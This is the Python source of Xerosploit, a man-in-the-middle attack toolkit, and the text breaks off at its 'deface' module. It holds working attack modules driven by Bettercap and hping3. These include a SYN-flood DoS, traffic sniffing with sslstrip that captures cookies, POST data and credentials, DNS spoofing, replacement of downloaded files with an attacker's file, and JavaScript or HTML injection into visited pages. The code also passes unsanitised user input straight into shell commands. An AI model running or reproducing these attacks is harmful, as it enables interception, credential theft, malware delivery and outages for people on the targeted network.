#!/usr/bin/python
# -*- coding: utf-8 -*-

#---------------------------------------------------------------------------#
# This file is part of Xerosploit.                                          #
# Xerosploit is free software: you can redistribute it and/or modify        #
# it under the terms of the GNU General Public License as published by      #
# the Free Software Foundation, either version 3 of the License, or         #
# (at your option) any later version.                                       #
#                                                                           #
# Xerosploit is distributed in the hope that it will be useful,             #
# but WITHOUT ANY WARRANTY; without even the implied warranty of            #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             #
# GNU General Public License for more details.                              #
#                                                                           #
# You should have received a copy of the GNU General Public License         #
# along with Xerosploit.  If not, see <http://www.gnu.org/licenses/>.       #
#                                                                           #
#---------------------------------------------------------------------------#
#                                                                           #
#        Copyright © 2019 Neodrix (www.neodrix.com)                         #
#                                                                           #
#---------------------------------------------------------------------------#

import os
from terminaltables import DoubleTable
from tabulate import tabulate
from banner import xe_header
import sys, traceback
from time import sleep

#Check if the script is running as root .
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] Xerosploit must be run as root. ¯\_(ツ)_/¯\n\033[1;m""")

# Exit message
exit_msg = "\n[++] Shutting down ... Goodbye. ( ^_^)／\n"
def main():
	try:

#Configure the network interface and gateway. 
		def config0():
			global up_interface
			up_interface = open('/opt/xerosploit/tools/files/iface.txt', 'r').read()
			up_interface = up_interface.replace("\n","")
			if up_interface == "0":
				up_interface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
				up_interface = up_interface.replace("\n","")

			global gateway
			gateway = open('/opt/xerosploit/tools/files/gateway.txt', 'r').read()
			gateway = gateway.replace("\n","")
			if gateway == "0":
				gateway = os.popen("ip route show | grep -i 'default via'| awk '{print $3 }'").read()
				gateway = gateway.replace("\n","")




		def home():

			config0()
			n_name = os.popen('iwgetid -r').read() # Get wireless network name
			n_mac = os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read() # Get network mac
			n_ip = os.popen("hostname -I").read() # Local IP address
			n_host = os.popen("hostname").read() # hostname


# Show a random banner. Configured in banner.py .  
			print (xe_header())

			print ("""
[+]═══════════[ Author : @LionSec1 \033[1;36m_-\|/-_\033[1;m Website: www.neodrix.com ]═══════════[+]

                      [ Powered by Bettercap and Nmap ]""")

			print(""" \033[1;36m
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                         Your Network Configuration                          █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m""")

			# Print network configuration , using tabulate as table.

			table = [["IP Address","MAC Address","Gateway","Iface","Hostname"],
					 ["","","","",""],
					 [n_ip,n_mac.upper(),gateway,up_interface,n_host]]
			print (tabulate(table, stralign="center",tablefmt="fancy_grid",headers="firstrow"))
			print ("")



			# Print xerosploits short description , using terminaltables as table. 
			table_datas = [
			    ['\033[1;36m\nInformation\n', 'XeroSploit is a penetration testing toolkit whose goal is to \nperform man in the middle attacks for testing purposes. \nIt brings various modules that allow to realise efficient attacks.\nThis tool is Powered by Bettercap and Nmap.\033[1;m']
			]
			table = DoubleTable(table_datas)
			print(table.table)


		# Get a list of all currently connected devices , using Nmap.
		def scan(): 
			config0()


			scan = os.popen("nmap " + gateway + "/24 -n -sP ").read()

			f = open('/opt/xerosploit/tools/log/scan.txt','w')
			f.write(scan)
			f.close()

			devices = os.popen(" grep report /opt/xerosploit/tools/log/scan.txt | awk '{print $5}'").read()

			devices_mac = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $3}'").read() + os.popen("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'").read().upper() # get devices mac and localhost mac address

			devices_name = os.popen("grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'").read() + "\033[1;32m(This device)\033[1;m"

			
			table_data = [
			    ['IP Address', 'Mac Address', 'Manufacturer'],
			    [devices, devices_mac, devices_name]
			]
			table = DoubleTable(table_data)

			# Show devices found on your network
			print("\033[1;36m[+]═══════════[ Devices found on your network ]═══════════[+]\n\033[1;m")
			print(table.table)
			target_ip()



		# Set the target IP address .
		def target_ip():
			target_parse = " --target " # Bettercap target parse . This variable will be wiped if the user want to perform MITM ATTACK on all the network. 

			print ("\033[1;32m\n[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.\n\033[1;m")
			target_ips = input("\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m").strip()
			
			if target_ips == "back":
				home()
			elif target_ips == "home":
				home()
			elif target_ips == "":
				print ("\033[1;91m\n[!] Please specify a target.\033[1;m") # error message if no target are specified. 
				target_ip()
			target_name = target_ips

			

#modules section
			def program0():
				
				# I have separed target_ip() and program0() to avoid falling into a vicious circle when the user Choose the "all" option
				cmd_target = os.popen("bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'").read() # IP forwarding
				print("\033[1;34m\n[++] " + target_name + " has been targeted. \033[1;m")
				def option():
					""" Choose a module """
					print("\033[1;32m\n[+] Which module do you want to load ? Enter 'help' for more information.\n\033[1;m")
					options = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m").strip() # select an option , port scan , vulnerability scan .. etc...
					# Port scanner
					if options == "pscan":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         Port Scanner                         █
█                                                              █
█      Find open ports on network computers and retrieve       █
█     versions of programs running on the detected ports       █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def pscan():
							

							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Pscan : You must specify only one target host at a time .\033[1;m")
								option()
							

							print("\033[1;32m\n[+] Enter 'run' to execute the 'pscan' command.\n\033[1;m")
							action_pscan = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m").strip()#ip to scan
							if action_pscan == "back":
								option()
							elif action_pscan == "exit":
								sys.exit(exit_msg)	
							elif action_pscan == "home":
								home()

								pscan()
							elif action_pscan == "run": 
								print("\033[1;34m\n[++] Please wait ... Scanning ports on " + target_name + " \033[1;m")
								scan_port = os.popen("nmap "+ target_ips + " -Pn" ).read()

								save_pscan = open('/opt/xerosploit/tools/log/pscan.txt','w') # Save scanned ports result.
								save_pscan.write(scan_port)
								save_pscan.close()

								# Grep port scan information
								ports = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $1}'" ).read().upper() # open ports
								ports_services = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $3}'" ).read().upper() # open ports services
								ports_state = os.popen("grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # port state



								# Show the result of port scan

								check_open_port = os.popen("grep SERVICE /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'" ).read().upper() # check if all port ara closed with the result
								if check_open_port == "STATE\n": 

									table_data = [
										['SERVICE', 'PORT', 'STATE'],
										[ports_services, ports, ports_state]
									]
									table = DoubleTable(table_data)
									print("\033[1;36m\n[+]═════════[ Port scan result for " + target_ips +" ]═════════[+]\n\033[1;m")
									print(table.table)
									pscan()

								else:
									# if all ports are closed , show error message . 
									print (check_open_port)
									print ("\033[1;91m[!] All 1000 scanned ports on " + target_name + " are closed\033[1;m")
									pscan()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								pscan()


						pscan()

			#DoS attack
					elif options == "dos":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          DoS Attack                          █
█                                                              █
█    Send a succession of SYN requests to a target's system    █
█    to make the system unresponsive to legitimate traffic     █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dos():
							 
							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Dos : You must specify only one target host at a time .\033[1;m")
								option()

							print("\033[1;32m\n[+] Enter 'run' to execute the 'dos' command.\n\033[1;m")
							

							action_dos = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m").strip() 

							if action_dos == "back":
								option()
							elif action_dos == "exit":
								sys.exit(exit_msg)	
							elif action_dos == "home":
								home()
							elif action_dos == "run":
								
								print("\033[1;34m\n[++] Performing a DoS attack to " + target_ips + " ... \n\n[++] Press 'Ctrl + C' to stop.\n\033[1;m")

								dos_cmd = os.system("hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source " + target_ips) # Dos command , using hping3
								dos()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dos()
						dos()

			# Ping
					elif options == "ping":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                             Ping                             █
█                                                              █
█               Check the accessibility of devices             █
█     and show how long it takes for packets to reach host     █
└══════════════════════════════════════════════════════════════┘     \033[1;m""") 
						def ping():

							if target_ips == "" or "," in target_ips:
								print("\033[1;91m\n[!] Ping : You must specify only one target host at a time .\033[1;m")
								option()
							
							
							print("\033[1;32m\n[+] Enter 'run' to execute the 'ping' command.\n\033[1;m")

							action_ping = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m").strip() 

							if action_ping == "back":
								option()
							elif action_ping == "exit":
								sys.exit(exit_msg)	
							elif action_ping == "home":
								home()
							elif action_ping == "run":
								print("\033[1;34m\n[++] PING " + target_ips + " (" + target_ips + ") 56(84) bytes of data ... \n\033[1;m")
								ping_cmd = os.popen("ping -c 5 " + target_ips).read()
								fping = open('/opt/xerosploit/tools/log/ping.txt','w') #Save ping result , then grep some informations.
								fping.write(ping_cmd)
								fping.close()

								ping_transmited = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $1}'").read()
								ping_receive = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $4}'").read()
								ping_lost = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $6}'").read()
								ping_time = os.popen("grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $10}'").read()

								table_data = [
				    				['Transmitted', 'Received', 'Loss','Time'],
				    				[ping_transmited, ping_receive, ping_lost, ping_time]
								]
								table = DoubleTable(table_data)
								print("\033[1;36m\n[+]═════════[ " + target_ips +" ping statistics  ]═════════[+]\n\033[1;m")
								print(table.table)
								ping()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								ping()

						ping()

					elif options == "injecthtml":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         Inject Html                          █
█                                                              █
█           Inject Html code in all visited webpage            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_html():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'injecthtml' command.\n\033[1;m")
							action_inject = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_inject == "back":
								option()
							elif action_inject == "exit":
								sys.exit(exit_msg)	
							elif action_inject == "home":
								home()
							elif action_inject == "run":
								print("\033[1;32m\n[+] Specify the file containing html code you would like to inject.\n\033[1;m")
								html_file = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mInjecthtml\033[0m\033[1;36m ➮ \033[1;m")
								
								if html_file == "back":
									inject_html()
								elif html_file == "home":
									home()
								else:

									html_file = html_file.replace("'","")
									print("\033[1;34m\n[++] Injecting Html code ... \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_code = os.system("cp " + html_file + " /opt/xerosploit/tools/bettercap/modules/tmp/file.html")
									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file " + html_file + " -I " + up_interface + " --gateway " + gateway )

									inject_html()

							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								inject_html()
						inject_html()


					elif options == "rdownload":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                       Replace Download                       █
█                                                              █
█            Replace files being downloaded via HTTP           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def rdownload():
							print("\033[1;32m\n[+] Please type 'run' to execute the 'rdownload' command.\n\033[1;m")
							action_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip() 
							if action_rdownload == "back":
								option()
							elif action_rdownload == "exit":
								sys.exit(exit_msg)	
							elif action_rdownload == "home":
								home()
							elif action_rdownload == "run":
								module = "/opt/xerosploit/tools/bettercap/modules/http/replace_file.rb"
								print("\033[1;32m\n[+] Specify the extension of the files to replace. (e.g. exe)\n\033[1;m")
								ext_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m").strip()
								print("\033[1;32m\n[+] Set the file to use in order to replace the ones matching the extension.\n\033[1;m")
								file_rdownload = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m")
								file_rdownload = file_rdownload.replace("'","")
								if file_rdownload == "back":
									rdownload()
								elif file_rdownload == "home":
									home()
								elif file_rdownload == "exit":
									sys.exit(exit_msg)
								else:
								
									print("\033[1;34m\n[++] All ." + ext_rdownload + " files will be replaced by " + file_rdownload + "  \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_rdownload = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_file.rb' --file-extension " + ext_rdownload + " --file-replace " + file_rdownload + " -I " + up_interface + " --gateway " + gateway )
									rdownload()						
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								rdownload()
						rdownload()
					elif options == "sniff":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           Sniffing                           █
█                                                              █
█      Capturing any data passed over your local network       █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")

						def snif():
							print("\033[1;32m\n[+] Please type 'run' to execute the 'sniff' command.\n\033[1;m")
							action_snif = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_snif == "back":
								option()
							elif action_snif == "exit":
								sys.exit(exit_msg)	
							elif action_snif == "home":
								home()
							elif action_snif == "run":
								def snif_sslstrip():

									print("\033[1;32m\n[+] Do you want to load sslstrip ? (y/n).\n\033[1;m")
									action_snif_sslstrip = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
									if action_snif_sslstrip == "y":
										print("\033[1;34m\n[++] All logs are saved on : /opt/xerosploit/xerosniff \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										print("\033[1;34m\n[++] sslstrip : \033[1;32mON\033[0m \033[1;m")
										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										filename = target_ips + date
										filename = filename.replace("\n","")
										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap --proxy " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] Logs have been saved. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
												snifflog()
										snifflog()

									elif action_snif_sslstrip == "n":
										print("\033[1;34m\n[++] All logs are saved on : /opt/xerosploit/xerosniff \033[1;m")
										print("\033[1;34m\n[++] Sniffing on " + target_name + "\033[1;m")
										print("\033[1;34m\n[++] sslstrip : \033[1;91mOFF\033[0m \033[1;m")
										print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
										
										date = os.popen("""date | awk '{print $2"-"$3"-"$4}'""").read()
										filename = target_ips + date
										filename = filename.replace("\n","")
										make_file = os.system("mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch " + filename + ".log")
										cmd_show_log = os.system("""xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/""" + filename + """.log  | GREP_COLOR='01;36' grep --color=always -E '""" + target_ips +  """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &""")
										cmd_snif = os.system("xettercap " + target_parse + target_ips + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I " + up_interface + " --gateway " + gateway + " -O, --log /opt/xerosploit/xerosniff/" + filename + ".log --sniffer-output /opt/xerosploit/xerosniff/" + filename + ".pcap")

										
										def snifflog():
											print("\033[1;32m\n[+] Do you want to save logs ? (y/n).\n\033[1;m")
											action_log = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m").strip()
											if action_log == "n":
												cmd_log = os.system("rm /opt/xerosploit/xerosniff/" + filename + ".*")
												print("\033[1;31m\n[++] Logs have been removed. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "y":
												print("\033[1;32m\n[++] Logs have been saved. \n\033[1;m")
												sleep(1)
												snif()

											elif action_log == "exit":
												sys.exit(exit_msg)


											else:
												print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
												snifflog()
										snifflog()

									elif action_snif == "back":
										snif()
									elif action_snif == "exit":
										sys.exit(exit_msg)	
									elif action_snif == "home":
										home()
									else:
										print("\033[1;91m\n[!] Error : Command not found. type 'y' or 'n'\033[1;m")
										snif_sslstrip()
								snif_sslstrip()
							
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								snif()

						snif()

					elif options == "dspoof":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                         DNS spoofing                         █
█                                                              █
█   Supply false DNS information to all target browsed hosts   █
█     Redirect all the http traffic to the specified one IP    █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def dspoof():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'dspoof' command.\n\033[1;m")
							action_dspoof = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_dspoof == "back":
								option()
							elif action_dspoof == "exit":
								sys.exit(exit_msg)	
							elif action_dspoof == "home":
								home()
							elif action_dspoof == "run":
								print("\033[1;32m\n[+] Enter the IP address where you want to redirect the traffic.\n\033[1;m")
								action_dspoof_ip = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m").strip()
								dns_conf = action_dspoof_ip + " .*\.*"
								outdns = open('/opt/xerosploit/tools/files/dns.conf','w')
								outdns.write(dns_conf)
								outdns.close()

								print("\033[1;34m\n[++] Redirecting all the traffic to " + action_dspoof_ip + " ... \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")

								cmd_dspoof = os.system("xettercap " + target_parse + target_ips + " --dns /opt/xerosploit/tools/files/dns.conf --custom-parser DNS -I " + up_interface + " --gateway " + gateway)
								dspoof()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								dspoof()
						dspoof()
					elif options == "yplay":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            Yplay                             █
█                                                              █
█    PLay youtube videos as background sound in all webpages   █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def yplay():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'yplay' command.\n\033[1;m")
							action_yplay = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_yplay == "back":
								option()
							elif action_yplay == "exit":
								sys.exit(exit_msg)	
							elif action_yplay == "home":
								home()
							elif action_yplay == "run":
								print("\033[1;32m\n[+] Insert a youtube video ID. (e.g. NvhZu5M41Z8)\n\033[1;m")
								video_id = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m").strip()
								if video_id == "back":
									option()
								elif video_id == "": # if raw = null
									print("\033[1;91m\n[!] Error : Please specify your video ID.\033[1;m")
									yplay()
								elif video_id == "exit":
									sys.exit(exit_msg)	
								elif video_id == "home":
									home()
								else:
									code = "<head> <iframe width='0' height='0' src='http://www.youtube.com/embed/" + video_id + "?autoplay=1' frameborder='0' allowfullscreen></iframe>"
									code_yplay = open('/opt/xerosploit/tools/bettercap/modules/tmp/yplay.txt','w')
									code_yplay.write(code)
									code_yplay.close()
									print("\033[1;34m\n[++] PLaying : https://www.youtube.com/watch?v=" + video_id + " \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_yplay = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/rickroll.rb' -I " + up_interface + " --gateway " + gateway)
									yplay()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								yplay()
						yplay()


					elif options == "replace":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          Image Replace                       █
█                                                              █
█        Replace all web pages images with your own one        █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def replace():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'replace' command.\n\033[1;m")
							action_replace = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_replace == "back":
								option()
							elif action_replace == "exit":
								sys.exit(exit_msg)	
							elif action_replace == "home":
								home()
							elif action_replace == "run":
								print("\033[1;32m\n[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)\n\033[1;m")
								img_replace = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m")
								img_replace = img_replace.replace("'","")
								if img_replace == "back":
									replace()
								elif img_replace == "exit":
									sys.exit(exit_msg)	
								elif img_replace == "home":
									home()
								else:
									from PIL import Image
									img = Image.open(img_replace)
									img.save('/opt/xerosploit/tools/bettercap/modules/tmp/ximage.png')
									print("\033[1;34m\n[++] All images will be replaced by " + img_replace + "\033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									

									cmd_replace = os.system("xettercap " + target_parse + target_ips + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/xerosploit/tools/bettercap/modules/tmp/ -I " + up_interface + " --gateway " + gateway)

									replace()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								replace()

						replace()


					elif options == "driftnet":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                            Driftnet                          █
█                                                              █
█          View all images requested by your target            █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def driftnet():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'driftnet' command.\n\033[1;m")
							action_driftnet = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_driftnet == "back":
								option()
							elif action_driftnet == "exit":
								sys.exit(exit_msg)	
							elif action_driftnet == "home":
								home()
							elif action_driftnet == "run":
								print("\033[1;34m\n[++] Capturing requested images on " + target_name + " ... \033[1;m")
								print("\033[1;34m\n[++] All captured images will be temporarily saved in /opt/xerosploit/xedriftnet \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_driftnet = os.system("mkdir -p /opt/xerosploit/xedriftnet && driftnet -d /opt/xerosploit/xedriftnet > /dev/null 2>&1 &")
								cmd_driftnet_sniff = os.system("xettercap  -X")
								cmd_driftnet_2 = os.system("rm -R /opt/xerosploit/xedriftnet")
								driftnet()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								driftnet()
						driftnet()

					elif options == "move":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                           Shakescreen                        █
█                                                              █
█                   Shaking Web Browser content                █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def shakescreen():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'move' command.\n\033[1;m")
							action_shakescreen = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_shakescreen == "back":
								option()
							elif action_shakescreen == "exit":
								sys.exit(exit_msg)	
							elif action_shakescreen == "home":
								home()
							elif action_shakescreen == "run":
								print("\033[1;34m\n[++] Injecting shakescreen.js  ... \033[1;m")
								print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
								cmd_shakescreen = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file '/opt/xerosploit/tools/bettercap/modules/js/shakescreen.js' -I " + up_interface + " --gateway " + gateway)
								shakescreen()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								shakescreen()

						shakescreen()

					elif options == "injectjs":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                       Inject Javascript                      █
█                                                              █
█       Inject Javascript code in all visited webpage.         █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def inject_j():
							print("\033[1;32m\n[+] Enter 'run' to execute the 'injectjs' command.\n\033[1;m")
							action_inject_j = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m").strip()
							if action_inject_j == "back":
								option()
							elif action_inject_j == "exit":
								sys.exit(exit_msg)	
							elif action_inject_j == "home":
								home()
							elif action_inject_j == "run":
								print("\033[1;32m\n[+] Specify the file containing js code you would like to inject.\n\033[1;m")
								js_file = input("\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m")
								js_file = js_file.replace("'","")
								if js_file == "back":
									inject_j()
								elif js_file == "exit":
									sys.exit(exit_msg)	
								elif js_file == "home":
									home()
								else:

									print("\033[1;34m\n[++] Injecting Javascript code ... \033[1;m")
									print("\033[1;34m\n[++] Press 'Ctrl + C' to stop . \n\033[1;m")
									cmd_inject_j = os.system("xettercap " + target_parse + target_ips + " --proxy-module=injectjs --js-file " + js_file + " -I " + up_interface + " --gateway " + gateway)
									inject_j()
							else:
								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
								inject_j()

						inject_j()

					elif options == "deface":
						print(""" \033[1;36m
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                        Deface Web Page                       █
█                                                              █
█        Overwrite all web pages with your HTML code           █
└══════════════════════════════════════════════════════════════┘     \033[1;m""")
						def deface():
